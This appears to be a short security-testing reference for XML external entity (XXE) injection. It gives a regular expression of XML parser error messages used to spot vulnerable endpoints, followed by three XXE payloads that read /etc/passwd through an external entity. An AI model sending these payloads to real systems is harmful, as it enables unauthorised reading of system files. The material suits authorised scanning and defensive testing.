# XEE Injection
### Errors Regexp
```
simplexml_load_string|parser error :|An error occured!|xmlParseEntityDecl|simplexml_load_string|xmlParseInternalSubset|DOCTYPE improperly terminated|Start tag expected|No declaration for attribute|No declaration for element|failed to load external entity|Start tag expected|Invalid URI: file:\/\/\/|Malformed declaration expecting version|Unicode strings with encoding|must be well-formed|Content is not allowed in prolog|org.xml.sax|SAXParseException|com.sun.org.apache.xerces|ParseError|nokogiri|REXML|XML syntax error on line|Error unmarshaling XML|conflicts with field|illegal character code|XML Parsing Error|SyntaxError|no root element|not well-formed
```
### Payload
```
<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "file:///etc/passwd">]><foo>&xxe_test;</foo>
```

